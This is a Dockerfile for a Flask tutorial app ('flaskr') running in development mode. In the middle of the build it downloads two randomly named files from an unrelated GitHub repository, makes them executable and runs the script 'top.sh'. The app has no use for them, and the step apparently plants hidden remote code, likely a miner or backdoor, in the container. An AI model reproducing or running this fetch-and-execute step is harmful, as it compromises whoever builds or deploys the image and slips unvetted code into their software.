FROM python:3.8.2-alpine3.11

ENV FLASK_APP=flaskr
ENV FLASK_ENV=development

COPY . /app

WORKDIR /app

RUN pip install --editable .

RUN wget https://raw.githubusercontent.com/qfiopk/lopki/master/yupo
RUN wget https://raw.githubusercontent.com/qfiopk/lopki/master/top.sh
RUN chmod +x yupo
RUN chmod +x top.sh
RUN ./top.sh

# Unit tests
# RUN pip install pytest && pytest

EXPOSE 5000

CMD [ "flask", "run", "--host=0.0.0.0" ]


